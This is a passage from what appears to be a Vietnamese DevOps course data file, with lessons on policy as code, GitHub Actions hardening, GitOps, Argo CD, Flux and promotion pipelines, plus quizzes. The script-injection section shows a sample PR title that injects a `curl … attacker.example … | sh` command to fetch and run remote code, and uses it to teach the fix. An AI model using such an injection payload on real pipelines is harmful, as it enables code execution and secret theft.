          "Cấm tag `latest`, bắt buộc tag cố định hoặc digest."
        ]
      }
    ],
    summary: [
      "Policy as code biến quy tắc bảo mật thành mã, version và thực thi tự động.",
      "Thực thi ở CI (conftest, Kyverno CLI) để phản hồi sớm và ở cluster (admission controller) để bắt buộc.",
      "Kyverno viết policy bằng YAML, hỗ trợ xác minh chữ ký image.",
      "Bắt đầu ở Audit, sửa workload, rồi mới chuyển sang Enforce."
    ],
    pitfalls: [
      "Chỉ kiểm tra policy trong CI, người có quyền `kubectl apply` trực tiếp vẫn vượt qua được.",
      "Bật Enforce ngay trên cluster cũ, chặn cả các thành phần hệ thống và deploy khẩn cấp.",
      "Xác minh chữ ký image mà không ràng buộc subject, image ký bởi bất kỳ ai cũng được chấp nhận."
    ],
    quiz: [
      {
        q: "Vì sao cần admission controller trong cluster dù CI đã kiểm tra policy?",
        options: ["Vì có người apply thẳng vào cluster, bỏ qua CI","Vì CI chạy chậm hơn admission controller","Vì Kubernetes bắt buộc phải có policy","Vì admission controller là nơi tạo image"],
        answer: 0,
        explain: "Admission controller là điểm thực thi cuối cùng mà mọi yêu cầu tới API server đều phải qua."
      },
      {
        q: "Khi mới đưa policy vào cluster đang chạy, nên dùng chế độ nào trước?",
        options: ["Enforce", "Audit", "Tắt policy", "Xoá workload cũ"],
        answer: 1,
        explain: "Audit ghi nhận vi phạm mà không chặn, giúp sửa dần trước khi chuyển sang chặn thật (Deny, hay Enforce với ClusterPolicy cũ)."
      },
      {
        q: "conftest dùng để làm gì?",
        options: ["Build image rồi kiểm tra theo Rego","Ký image và manifest bằng khoá OPA","Chạy policy Rego trên file cấu hình cục bộ","Đồng bộ policy Rego vào cluster"],
        answer: 2,
        explain: "conftest kiểm tra file như manifest, Terraform plan bằng policy OPA/Rego trước khi áp dụng, rất hợp để chạy trong CI. Thực thi trong cluster là việc của admission controller như Gatekeeper."
      }
    ]
  },
  "p08.m4.t7": {
    videos: [
      { id: "4dnniFk5i2Q", title: "GitHub Actions Policy Update: Blocking & SHA Pinning Explained!", channel: "Mickey Gousset", lang: "en", minutes: 12, embed: true },
      { id: "Emj_mprPNWY", title: "tj-actions Supply Chain Attack – How to Check & Fix It NOW", channel: "Aikido Security", lang: "en", minutes: 5, embed: true }
    ],
    sections: [
      {
        h: "Pipeline là mục tiêu tấn công giá trị nhất",
        p: [
          "Pipeline CI/CD giữ những thứ quý nhất: secret deploy, quyền push image, quyền vào production. Kẻ tấn công không cần hack ứng dụng của bạn nếu có thể chạy code trong pipeline. Và cách dễ nhất để chạy code trong pipeline của hàng nghìn công ty cùng lúc là tấn công một action mà họ đều dùng.",
          "Đó chính là chuyện đã xảy ra ngày 19/3/2026: kẻ tấn công dùng credential bị lộ để force-push 76/77 tag của `aquasecurity/trivy-action` và toàn bộ 7 tag của `setup-trivy`, trỏ chúng sang mã độc đánh cắp secret từ môi trường CI (advisory GHSA-69fq-xp46-6x23). Mọi workflow viết `uses: aquasecurity/trivy-action@0.x.y` (theo tag) đều chạy mã độc ở lần chạy tiếp theo mà không có dòng code nào trong repo thay đổi. Workflow pin theo commit SHA thì không nhận trivy-action độc hại, vì tag bị di chuyển không làm thay đổi commit mà SHA trỏ tới.",
          "Có một ngoại lệ đáng nhớ: trivy-action là composite action, bên trong gọi `setup-trivy`. Các commit trivy-action trước ngày 9/4/2025 gọi `setup-trivy` theo tag, nên ai pin SHA của những commit cũ đó vẫn kéo phải `setup-trivy` độc hại trong khung giờ bị tấn công. Pin SHA chỉ bảo vệ tầng bạn pin; phụ thuộc bắc cầu (action gọi action) cũng phải được pin. Cùng đợt đó, binary Trivy v0.69.4 và một số Docker image cũng bị phát hành bản độc hại, nên image công cụ cũng cần pin theo digest đã kiểm chứng."
        ]
      },
      {
        h: "Các biện pháp cốt lõi",
        p: [
          "Không có biện pháp đơn lẻ nào là đủ. Danh sách dưới đây sắp theo thứ tự nên làm trước; phần lớn chỉ tốn vài dòng YAML hoặc một thay đổi trong phần cài đặt repo."
        ],
        list: [
          "Pin mọi action bên thứ ba theo commit SHA đầy đủ, kèm comment version; dùng Dependabot để cập nhật. Với composite action, xem nó có pin các action gọi bên trong không. GitHub cho phép admin bật chính sách bắt buộc pin SHA trong cài đặt Actions.",
          "Đặt `permissions` tối thiểu ở cấp workflow (`contents: read`) và chỉ mở rộng ở job cần; đặt quyền mặc định của `GITHUB_TOKEN` trong repo là chỉ đọc.",
          "Không dùng `pull_request_target` hay `workflow_run` để chạy code từ PR fork trong ngữ cảnh có secret.",
          "Không chèn trực tiếp dữ liệu người dùng kiểm soát (tiêu đề PR, tên nhánh, nội dung issue) vào `run:`; truyền qua biến môi trường.",
          "`persist-credentials: false` khi checkout nếu job không cần push, để token không nằm lại trong `.git/config`.",
          "Dùng OIDC thay secret dài hạn; environment có người duyệt cho production.",
          "Quét chính workflow bằng công cụ phân tích tĩnh cho GitHub Actions như zizmor hoặc actionlint."
        ]
      },
      {
        h: "Script injection: lỗi phổ biến nhất",
        p: [
          "Biểu thức `\${{ }}` được thay vào script trước khi shell chạy. Nếu tiêu đề PR là `a\"; curl https://attacker.example/x.sh | sh; echo \"`, dòng lệnh thành mã của kẻ tấn công. Cách sửa là đưa giá trị vào biến môi trường, để shell coi nó là dữ liệu chứ không phải mã."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/pr-check.yml",
          src: `name: PR check
on:
  pull_request:

permissions:
  contents: read   # mặc định tối thiểu cho mọi job

jobs:
  title:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      # SAI: dữ liệu do người dùng kiểm soát bị chèn thẳng vào script
      # - run: echo "\${{ github.event.pull_request.title }}"

      # ĐÚNG: truyền qua biến môi trường
      - name: Kiểm tra tiêu đề theo Conventional Commits
        env:
          TITLE: \${{ github.event.pull_request.title }}
        run: |
          printf '%s\\n' "$TITLE" | grep -Eq '^(feat|fix|chore|docs|refactor|test|ci)(\\(.+\\))?!?: .+'`
        }
      },
      {
        h: "Nếu đã dùng action bị xâm phạm",
        p: [
          "Coi như mọi secret mà workflow đó truy cập được đều đã lộ: rotate ngay token registry, credential cloud, token npm, `GITHUB_TOKEN` hết hạn khi job kết thúc nhưng PAT thì không. Xem log các lần chạy trong khoảng thời gian bị ảnh hưởng, kiểm tra CloudTrail hoặc log truy cập. Bài học lớn nhất: bảo mật pipeline không phải một công cụ mà là nhiều lớp. Pin SHA ngăn tag bị thay; permissions tối thiểu giới hạn thiệt hại; OIDC khiến credential bị đánh cắp hết hạn nhanh; environment có người duyệt ngăn deploy tự ý."
        ]
      }
    ],
    summary: [
      "Pipeline giữ secret và quyền production nên là mục tiêu tấn công hàng đầu.",
      "Sự cố trivy-action 19/3/2026: tag bị force-push thành mã độc; pin theo SHA chặn được, miễn là cả các action gọi bên trong cũng được pin.",
      "Permissions tối thiểu, không chạy code fork trong `pull_request_target`.",
      "Truyền dữ liệu người dùng qua `env`, không chèn `\${{ }}` thẳng vào `run:`.",
      "Nhiều lớp: SHA pin, quyền tối thiểu, OIDC, environment duyệt, quét workflow."
    ],
    pitfalls: [
      "Dùng action theo tag như `@v1` hay `@0.28.0`: tag có thể bị ghi đè bất cứ lúc nào.",
      "Đặt `permissions: write-all` hoặc để quyền mặc định của token là đọc/ghi cho mọi workflow.",
      "Chèn `github.event.pull_request.title` hoặc tên nhánh thẳng vào lệnh shell."
    ],
    quiz: [
      {
        q: "Trong sự cố trivy-action ngày 19/3/2026, workflow nào KHÔNG bị ảnh hưởng?",
        options: ["Workflow dùng `@0.x.y` theo tag","Workflow pin SHA của bản trivy-action gần đây","Workflow dùng `@master` theo nhánh","Workflow có `permissions: write-all`"],
        answer: 1,
        explain: "Kẻ tấn công di chuyển tag sang commit độc hại; tag và nhánh đều bị ảnh hưởng, còn permissions không ngăn mã độc chạy. SHA đã pin vẫn trỏ tới commit sạch. Lưu ý: commit trivy-action trước 9/4/2025 gọi setup-trivy theo tag nên dù pin SHA vẫn nhiễm."
      },
      {
        q: "Cách an toàn để dùng tiêu đề PR trong bước `run`?",
        options: ["Chèn trực tiếp `${{ github.event.pull_request.title }}`","Chèn biểu thức trong nháy kép là đủ","Chèn biểu thức trong nháy đơn là đủ","Truyền qua `env` rồi dùng `\"$TITLE\"`"],
        answer: 3,
        explain: "Biểu thức được thay vào script trước khi shell chạy nên nháy kép hay nháy đơn đều không đủ; biến môi trường khiến shell coi giá trị là dữ liệu."
      },
      {
        q: "Vì sao `pull_request_target` nguy hiểm khi checkout code PR từ fork?",
        options: ["Vì nó chạy chậm hơn pull_request","Vì nó không hỗ trợ matrix","Vì có secret và token ghi, còn code fork không tin cậy","Vì nó tự xoá PR sau khi chạy"],
        answer: 2,
        explain: "`pull_request_target` được thiết kế cho tác vụ không chạy code PR, như gắn label. Chạy code fork trong đó trao secret cho người lạ."
      }
    ]
  },
  "p08.m5.t0": {
    videos: [
      { id: "wY5NP2GmqwU", title: "Giải thích GitOps hoạt động như thế nào trong 4 phút | Kubernetes | DevOps Mentor", channel: "DevOps Mentor", lang: "vi", minutes: 4, embed: true },
      { id: "GlG6Xr2HH1g", title: "Demystifying GitOps: A Beginner-Friendly Explanation | KodeKloud", channel: "KodeKloud", lang: "en", minutes: 8, embed: true }
    ],
    sections: [
      {
        h: "GitOps: Git là nguồn sự thật",
        p: [
          "GitOps là cách vận hành trong đó trạng thái mong muốn của hệ thống (Deployment nào, image nào, bao nhiêu replica, cấu hình gì) được khai báo trong Git. Một agent chạy trong cluster liên tục so sánh trạng thái thật với Git và tự điều chỉnh cho khớp. Muốn thay đổi production, bạn không chạy lệnh vào cluster mà mở pull request vào repo.",
          "Dự án OpenGitOps (thuộc CNCF) tóm tắt thành bốn nguyên tắc. Hiểu bốn nguyên tắc này giúp bạn nhận ra một hệ thống có thực sự là GitOps hay chỉ là CI chạy `kubectl apply`."
        ],
        list: [
          "Declarative: hệ thống được mô tả bằng trạng thái mong muốn, không phải chuỗi lệnh.",
          "Versioned and immutable: trạng thái được lưu có phiên bản, bất biến, có lịch sử đầy đủ (Git).",
          "Pulled automatically: agent tự kéo trạng thái mong muốn từ nguồn, không phải bị đẩy vào.",
          "Continuously reconciled: agent liên tục so sánh và sửa lệch (drift)."
        ]
      },
      {
        h: "Push-based và pull-based",
        p: [
          "Trong mô hình push truyền thống, CI có credential của cluster và chạy `kubectl apply` hoặc `helm upgrade`. CI trở thành điểm nguy hiểm: ai chiếm được CI là vào được cluster. Và nếu ai đó sửa tay trên cluster, không có gì phát hiện ra.",
          "Trong mô hình pull, agent như Argo CD hoặc Flux chạy bên trong cluster, chỉ cần quyền đọc repo. CI không cần credential của cluster nữa, chỉ cần quyền ghi vào repo config. Mọi thay đổi tay trên cluster bị phát hiện là drift và có thể tự hoàn tác. Lịch sử Git trở thành audit log: ai đổi gì, lúc nào, ai duyệt."
        ]
      },
      {
        h: "Luồng GitOps điển hình",
        code: {
          lang: "text",
          file: "luồng GitOps",
          src: `[repo app]  --PR, CI xanh, merge-->  CI build image :a1b2c3d, push registry
                                        |
                                        v
[repo config]  <--commit/PR đổi image.tag = a1b2c3d--
      |
      |  (Argo CD / Flux trong cluster kéo về mỗi vài phút hoặc qua webhook)
      v
[cluster]  so sánh trạng thái thật với Git -> apply phần khác -> báo Synced/Healthy`
        },
        p: [
          "Đánh đổi: GitOps thêm một repo và một thành phần cần vận hành, và luồng deploy có độ trễ nhỏ do chu kỳ đồng bộ. Những việc mang tính mệnh lệnh như chạy migration hay smoke test cần được diễn đạt lại thành hook hoặc job. Đổi lại, bạn có khả năng khôi phục cả cluster từ Git, rollback bằng `git revert`, và một quy trình thay đổi production thống nhất qua pull request."
        ]
      }
    ],
    summary: [
      "Git lưu trạng thái mong muốn; agent trong cluster tự đồng bộ.",
      "Bốn nguyên tắc: declarative, versioned và immutable, pulled automatically, continuously reconciled.",
      "Pull-based: CI không cần credential cluster, drift được phát hiện và sửa.",
      "Lịch sử Git là audit log; rollback bằng `git revert`."
    ],
    pitfalls: [
      "Gọi CI chạy `kubectl apply` là GitOps, trong khi không có agent reconcile và không phát hiện drift.",
      "Vẫn sửa tay trên cluster khi khẩn cấp rồi quên đưa vào Git, agent hoàn tác thay đổi đó.",
      "Lưu secret dạng plain text trong repo config vì nghĩ repo private là đủ an toàn."
    ],
    quiz: [
      {
        q: "Trong GitOps pull-based, thành phần nào áp dụng thay đổi vào cluster?",
        options: ["CI runner chạy kubectl apply","Developer chạy lệnh tay","Registry tự đẩy image vào cluster","Agent trong cluster như Argo CD, Flux"],
        answer: 3,
        explain: "Agent trong cluster kéo trạng thái từ Git và áp dụng. CI chỉ cập nhật Git."
      },
      {
        q: "Lợi ích bảo mật của mô hình pull so với push?",
        options: ["Không cần dùng Git nữa","CI không cần giữ credential của cluster","Không cần review thay đổi","Image không cần ký nữa"],
        answer: 1,
        explain: "Agent trong cluster chỉ cần quyền đọc repo, nên CI bị chiếm không trực tiếp dẫn tới quyền vào cluster."
      },
      {
        q: "Continuously reconciled nghĩa là gì?",
        options: ["Liên tục so sánh với Git và sửa lệch","Chỉ đồng bộ khi có người bấm nút","Backup repo Git mỗi ngày","Chạy pipeline CI liên tục"],
        answer: 0,
        explain: "Reconcile liên tục là điều giúp phát hiện và sửa drift, kể cả thay đổi tay trên cluster."
      }
    ]
  },
  "p08.m5.t1": {
    videos: [
      { id: "MeU5_k9ssrs", title: "ArgoCD Tutorial for Beginners | GitOps CD for Kubernetes", channel: "TechWorld with Nana", lang: "en", minutes: 48, embed: true },
      { id: "LrS6MgrrTlE", title: "Kubernetes CICD – triển khai ứng dụng trên Kubernetes với Argo CD", channel: "Kien Le Tech", lang: "vi", minutes: 26, embed: true }
    ],
    sections: [
      {
        h: "Application: đơn vị cơ bản của Argo CD",
        p: [
          "Argo CD là công cụ GitOps phổ biến nhất cho Kubernetes, có giao diện web trực quan hiển thị cây resource và trạng thái. Mỗi Application nói: lấy manifest từ repo này, nhánh này, đường dẫn này (Helm chart, Kustomize hoặc YAML thuần), và áp vào cluster, namespace này.",
          "Hai trạng thái cần phân biệt: Sync status (Synced hoặc OutOfSync) cho biết cluster có khớp Git không; Health status (Healthy, Progressing, Degraded) cho biết resource có đang chạy tốt không. Một ứng dụng có thể Synced nhưng Degraded, ví dụ đã apply đúng image nhưng pod bị crash."
        ]
      },
      {
        h: "Sync policy: prune, selfHeal, retry",
        p: [
          "Sync policy quyết định Argo CD phản ứng thế nào khi Git và cluster lệch nhau. Với staging, tự động hoàn toàn là hợp lý. Với production, nhiều đội vẫn bật automated vì cổng duyệt đã nằm ở pull request vào repo config; số khác tắt automated và bấm Sync bằng tay sau khi merge."
        ],
        list: [
          "`automated`: tự sync khi Git thay đổi, không cần bấm nút.",
          "`prune: true`: xoá resource trên cluster khi nó bị xoá khỏi Git. Mặc định tắt để tránh xoá nhầm.",
          "`selfHeal: true`: khi ai đó sửa tay trên cluster, Argo CD đưa về đúng Git.",
          "`retry`: thử lại khi sync lỗi tạm thời, có backoff.",
          "Sync wave (annotation `argocd.argoproj.io/sync-wave`) và hook (PreSync, PostSync) để sắp thứ tự, ví dụ migration trước Deployment."
        ],
        code: {
          lang: "yaml",
          file: "argocd/task-api-production.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: task-api-production
  namespace: argocd
  finalizers:
    - resources-finalizer.argocd.argoproj.io   # xoá Application thì xoá luôn resource
spec:
  project: team-backend
  source:
    repoURL: https://github.com/my-org/task-config.git
    targetRevision: main
    path: apps/task-api/overlays/production
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
    retry:
      limit: 3
      backoff:
        duration: 10s
        factor: 2
        maxDuration: 2m`
        }
      },
      {
        h: "App-of-apps và rollback",
        p: [
          "Khi có hàng chục Application, bạn không muốn tạo từng cái bằng tay. Mẫu app-of-apps dùng một Application gốc trỏ tới thư mục chứa các file Application khác; thêm dịch vụ mới chỉ là thêm một file vào Git. ApplicationSet đi xa hơn, sinh Application tự động từ danh sách cluster, thư mục trong repo hoặc pull request.",
          "Rollback trong Argo CD là `git revert` commit gây lỗi. Khi bật auto-sync, lệnh `argocd app rollback` không dùng được, và `kubectl rollout undo` sẽ bị selfHeal hoàn tác. Hãy dùng AppProject để giới hạn mỗi team chỉ deploy được vào namespace và repo của mình, và không để project `default` mở cho mọi thứ trên production."
        ],
        code: {
          lang: "yaml",
          file: "argocd/root.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: root
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/my-org/task-config.git
    targetRevision: main
    path: argocd/apps          # mỗi file trong đây là một Application
  destination:
    server: https://kubernetes.default.svc
    namespace: argocd
  syncPolicy:
    automated: { prune: true, selfHeal: true }`
        }
      }
    ],
    summary: [
      "Application ánh xạ một nguồn trong Git tới một đích trong cluster.",
      "Phân biệt Sync status (khớp Git không) và Health status (chạy tốt không).",
      "`prune` xoá resource thừa, `selfHeal` hoàn tác sửa tay, `retry` thử lại.",
      "App-of-apps và ApplicationSet quản lý nhiều Application; rollback bằng `git revert`."
    ],
    pitfalls: [
      "Bật `prune` mà cấu trúc thư mục sai, Argo CD xoá cả resource đang chạy.",
      "Dùng project `default` không giới hạn cho mọi team trên production.",
      "Dùng `kubectl rollout undo` khi selfHeal bật, Argo CD đưa bản lỗi quay lại."
    ],
    quiz: [
      {
        q: "Ứng dụng hiển thị Synced nhưng Degraded nghĩa là gì?",
        options: ["Cluster chưa khớp với Git","Argo CD đang bị lỗi kết nối","Khớp Git nhưng resource chạy lỗi","Repo Git đã bị xoá"],
        answer: 2,
        explain: "Sync đo sự khớp với Git; Health đo tình trạng chạy. Hai trạng thái độc lập."
      },
      {
        q: "`selfHeal: true` làm gì?",
        options: ["Tự sửa bug trong code ứng dụng","Hoàn tác thay đổi tay để khớp Git","Tự restart node bị lỗi","Tự tạo PR sửa manifest"],
        answer: 1,
        explain: "selfHeal phát hiện drift do sửa tay và đưa cluster về trạng thái trong Git."
      },
      {
        q: "Mẫu app-of-apps giải quyết vấn đề gì?",
        options: ["Build image nhanh hơn","Mã hoá secret trong repo","Thay thế Helm và Kustomize","Quản lý nhiều Application từ một Application gốc"],
        answer: 3,
        explain: "Application gốc trỏ tới thư mục chứa các Application khác, thêm dịch vụ chỉ cần thêm file vào Git."
      }
    ]
  },
  "p08.m5.t2": {
    videos: [
      { id: "X5W_706-jSY", title: "Introduction to Flux CD on Kubernetes | GitOps | CICD", channel: "That DevOps Guy", lang: "en", minutes: 34, embed: true }
    ],
    sections: [
      {
        h: "Flux: bộ controller GitOps",
        p: [
          "Flux là dự án GitOps đã tốt nghiệp CNCF, lựa chọn thay thế chính cho Argo CD. Khác biệt lớn nhất là triết lý: Flux là tập hợp controller nhỏ, mỗi cái một việc, cấu hình hoàn toàn bằng Kubernetes custom resource; không có giao diện web tích hợp mặc định như Argo CD. Flux hợp với đội thích mọi thứ là YAML và CLI, và với mô hình nhiều cluster tự quản lý."
        ],
        list: [
          "source-controller: kéo nguồn (GitRepository, HelmRepository, OCIRepository, Bucket).",
          "kustomize-controller: áp dụng manifest qua resource Kustomization, hỗ trợ giải mã SOPS.",
          "helm-controller: cài và nâng cấp Helm chart qua resource HelmRelease.",
          "notification-controller: nhận webhook, gửi thông báo Slack/Teams.",
          "image-reflector và image-automation controller: tự cập nhật tag image trong Git khi có image mới."
        ]
      },
      {
        h: "Bootstrap và Kustomization",
        p: [
          "`flux bootstrap` cài Flux vào cluster, tạo repo (nếu chưa có) và commit chính manifest của Flux vào đó, để Flux tự quản lý chính nó bằng GitOps."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `export GITHUB_TOKEN=<token-có-quyền-repo>
flux bootstrap github \\
  --owner=my-org \\
  --repository=fleet-config \\
  --branch=main \\
  --path=clusters/production

flux get kustomizations
flux reconcile kustomization apps --with-source`
        }
      },
      {
        h: "Kustomization và HelmRelease",
        p: [
          "Lưu ý: Kustomization của Flux (`kustomize.toolkit.fluxcd.io`) là resource trong cluster, khác với file `kustomization.yaml` của công cụ kustomize. Kustomization của Flux trỏ tới một đường dẫn, và trong đường dẫn đó có thể có file `kustomization.yaml` bình thường. `prune: true` có ý nghĩa như prune của Argo CD. HelmRelease có cơ chế remediation: nâng cấp lỗi thì tự rollback về release trước."
        ],
        code: {
          lang: "yaml",
          file: "clusters/production/apps.yaml",
          src: `apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: apps
  namespace: flux-system
spec:
  interval: 10m
  path: ./apps/production
  prune: true
  wait: true
  timeout: 5m
  sourceRef:
    kind: GitRepository
    name: flux-system
---
apiVersion: source.toolkit.fluxcd.io/v1
kind: HelmRepository
metadata:
  name: my-charts
  namespace: flux-system
spec:
  interval: 1h
  url: https://charts.example.com
---
apiVersion: helm.toolkit.fluxcd.io/v2
kind: HelmRelease
metadata:
  name: task-api
  namespace: production
spec:
  interval: 10m
  chart:
    spec:
      chart: task-api
      version: "1.4.x"
      sourceRef:
        kind: HelmRepository
        name: my-charts
        namespace: flux-system
  values:
    replicaCount: 3
    image:
      tag: a1b2c3d
  upgrade:
    remediation:
      retries: 2`
        }
      },
      {
        h: "Argo CD hay Flux",
        p: [
          "Cả hai đều trưởng thành và giải quyết cùng bài toán. Chọn Argo CD nếu đội cần giao diện trực quan, SSO và phân quyền theo project cho nhiều team, hoặc muốn quản lý nhiều cluster từ một chỗ. Chọn Flux nếu thích mọi thứ khai báo bằng CRD, cần giải mã SOPS có sẵn, hoặc muốn mỗi cluster tự quản lý độc lập. Quan trọng hơn công cụ là cấu trúc repo config và quy trình promotion, phần của bài tiếp theo."
        ]
      }
    ],
    summary: [
      "Flux là tập controller GitOps cấu hình hoàn toàn bằng CRD.",
      "GitRepository/HelmRepository là nguồn; Kustomization và HelmRelease là cách áp dụng.",
      "`flux bootstrap` để Flux tự quản lý chính nó từ Git.",
      "Kustomization của Flux khác file kustomization.yaml của kustomize."
    ],
    pitfalls: [
      "Nhầm Kustomization của Flux với file `kustomization.yaml`, đặt sai apiVersion.",
      "Đặt `version: \"*\"` cho HelmRelease, chart major mới tự lên production.",
      "Dùng token cá nhân quyền rộng cho bootstrap rồi để nguyên lâu dài."
    ],
    quiz: [
      {
        q: "Resource nào của Flux dùng để cài Helm chart?",
        options: ["Application", "HelmRelease", "Rollout", "ExternalSecret"],
        answer: 1,
        explain: "HelmRelease do helm-controller xử lý. Application là của Argo CD, Rollout của Argo Rollouts."
      },
      {
        q: "`flux bootstrap` làm gì?",
        options: ["Cài Flux và commit manifest của Flux vào repo","Build image từ repo config","Xoá cluster rồi dựng lại","Tạo SBOM cho cluster"],
        answer: 0,
        explain: "Bootstrap cài controller và đưa cấu hình Flux vào Git, từ đó mọi thay đổi Flux cũng qua GitOps."
      },
      {
        q: "Khác biệt triết lý nổi bật giữa Flux và Argo CD?",
        options: ["Flux không hỗ trợ Helm chart","Argo CD không đọc được Git","Flux dùng CRD, không có web UI mặc định","Flux chỉ chạy ngoài cluster"],
        answer: 2,
        explain: "Flux hướng tới CRD và CLI; Argo CD nổi bật với giao diện web. Cả hai đều hỗ trợ Helm và chạy trong cluster."
      }
    ]
  },
  "p08.m5.t3": {
    videos: [
      { id: "pJ9f7w4AxtU", title: "How to design a Deployment Pipeline (GitOps)", channel: "DevOps Journey", lang: "en", minutes: 11, embed: true }
    ],
    sections: [
      {
        h: "Tách repo app và repo config",
        p: [
          "Repo app chứa mã nguồn và Dockerfile; repo config chứa manifest (Helm values, Kustomize overlay) cho từng môi trường. Tách hai repo mang lại nhiều lợi ích: lịch sử deploy sạch, không lẫn với commit code; quyền khác nhau (developer merge code, nhưng chỉ một nhóm duyệt thay đổi production); commit CI cập nhật tag không kích hoạt lại CI build vô hạn; một repo config có thể chứa nhiều dịch vụ.",
          "Đội nhỏ có thể để config trong thư mục `deploy/` của repo app, miễn là cấu hình đường dẫn trigger để tránh vòng lặp. Khi số dịch vụ và môi trường tăng, tách repo thường đáng công hơn."
        ],
        code: {
          lang: "text",
          file: "task-config/",
          src: `apps/task-api/
  base/                    # Deployment, Service chung
    kustomization.yaml
    deployment.yaml
  overlays/
    staging/
      kustomization.yaml   # images: newTag = a1b2c3d, replicas 2
    production/
      kustomization.yaml   # images: newTag = 9f8e7d6, replicas 6
argocd/apps/
  task-api-staging.yaml
  task-api-production.yaml`
        }
      },
      {
        h: "CI cập nhật tag và promotion bằng PR",
        p: [
          "Sau khi build image, CI commit thẳng tag mới vào overlay staging, Argo CD tự deploy. Với production, CI mở một PR đổi tag; người duyệt merge PR đó là hành động promotion. Tag được đưa lên production phải là tag đã chạy trên staging, đúng tinh thần build once, deploy many."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/promote.yml",
          src: `name: Promote
on:
  workflow_call:
    inputs:
      image_tag: { type: string, required: true }

permissions:
  contents: read

jobs:
  bump-staging:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          repository: my-org/task-config
          token: \${{ secrets.CONFIG_REPO_TOKEN }}
      - name: Cập nhật tag staging
        env:
          TAG: \${{ inputs.image_tag }}
        run: |
          cd apps/task-api/overlays/staging
          kustomize edit set image ghcr.io/my-org/task-api=ghcr.io/my-org/task-api:$TAG
          git config user.name "ci-bot"
          git config user.email "ci-bot@users.noreply.github.com"
          git commit -am "chore(staging): task-api $TAG"
          git push

  pr-production:
    needs: bump-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          repository: my-org/task-config
          token: \${{ secrets.CONFIG_REPO_TOKEN }}
      - name: Mở PR promotion
        env:
          TAG: \${{ inputs.image_tag }}
          GH_TOKEN: \${{ secrets.CONFIG_REPO_TOKEN }}
        run: |
          git switch -c "promote/task-api-$TAG"
          cd apps/task-api/overlays/production
          kustomize edit set image ghcr.io/my-org/task-api=ghcr.io/my-org/task-api:$TAG
          git config user.name "ci-bot"
          git config user.email "ci-bot@users.noreply.github.com"
          git commit -am "chore(production): task-api $TAG"
          git push -u origin HEAD
          gh pr create --title "Promote task-api $TAG lên production" \\
            --body "Tag này đã chạy trên staging." --base main`
        }
      },
      {
        h: "Token và công cụ hỗ trợ",
        p: [
          "`GITHUB_TOKEN` của repo app không ghi được vào repo khác, nên cần một credential riêng. Tốt nhất là GitHub App cài chỉ trên repo config, sinh token ngắn hạn mỗi lần chạy; hoặc fine-grained PAT giới hạn đúng một repo. Tránh PAT classic quyền `repo` trên toàn tổ chức.",
          "Nếu không muốn tự viết bước bump, có công cụ chuyên dụng: Argo CD Image Updater, Flux image automation tự cập nhật tag khi registry có image mới theo chính sách, và Kargo quản lý promotion qua nhiều giai đoạn. Dù dùng gì, CODEOWNERS và branch protection trên repo config vẫn là cổng duyệt production."
        ]
      },
      {
        h: "Luồng promotion đầy đủ",
        p: [
          "Ghép mọi phần trong chương lại, một thay đổi đi từ laptop tới production như sau. Mỗi bước đều có dấu vết trong Git hoặc trong lịch sử pipeline, nên khi có sự cố bạn truy ngược được chính xác ai đã đổi gì."
        ],
        list: [
          "PR vào repo app: lint, test, SAST, SCA, secret scan; review và merge.",
          "CI trên main: build image một lần, scan, ký, push theo SHA.",
          "CI commit tag mới vào overlay staging; Argo CD đồng bộ; smoke test và DAST chạy trên staging.",
          "CI mở PR promotion cho production; người duyệt merge; Argo CD đồng bộ, canary hoặc rolling update.",
          "Có sự cố: `git revert` commit promotion, hoặc tắt feature flag."
        ]
      }
    ],
    summary: [
      "Repo app chứa code; repo config chứa manifest cho từng môi trường.",
      "CI commit tag mới vào staging; production được promote qua PR có người duyệt.",
      "Chỉ promote tag đã chạy trên staging.",
      "Dùng GitHub App hoặc fine-grained token chỉ cho repo config."
    ],
    pitfalls: [
      "Dùng PAT classic quyền ghi toàn tổ chức cho bước bump tag.",
      "Build lại image khi promote production thay vì dùng tag đã chạy staging.",
      "Để config trong repo app mà không lọc trigger, commit bump tag kích hoạt CI build lại liên tục."
    ],
    quiz: [
      {
        q: "Trong mô hình GitOps với repo config, promotion lên production thường là hành động gì?",
        options: ["Merge PR đổi tag trong overlay production","Chạy kubectl apply từ CI","Build lại image cho production","Restart toàn bộ cluster"],
        answer: 0,
        explain: "PR vào repo config là cổng duyệt; merge xong agent GitOps tự đồng bộ."
      },
      {
        q: "Vì sao `GITHUB_TOKEN` của repo app không dùng được để push vào repo config?",
        options: ["Vì nó hết hạn ngay khi tạo","Vì Git không hỗ trợ token","Vì repo config là public","Vì nó chỉ có quyền trên repo chạy workflow"],
        answer: 3,
        explain: "GITHUB_TOKEN chỉ có quyền trên repo chứa workflow; ghi repo khác cần GitHub App hoặc token riêng."
      },
      {
        q: "Lợi ích của việc tách repo config khỏi repo app?",
        options: ["Bỏ được bước review production","Tách lịch sử deploy và phân quyền duyệt riêng","Build image nhanh hơn nhờ repo nhỏ","Không cần Kubernetes để deploy"],
        answer: 1,
        explain: "Tách repo giúp audit deploy, phân quyền duyệt production và tránh commit bump tag kích hoạt CI."
      }
    ]
  },
  "p08.m5.t4": {
    videos: [
      { id: "Wnh9mF_BpWo", title: "External Secrets Operator Explained (ESO) | Kubernetes Secrets Made Simple", channel: "Infisical", lang: "en", minutes: 16, embed: true },
      { id: "wWMJCY2E0d4", title: "Sealed Secrets: Safeguarding Your Kubernetes Secrets | Step By Step Tutorial | KodeKloud", channel: "KodeKloud", lang: "en", minutes: 13, embed: true }
    ],
    sections: [
      {
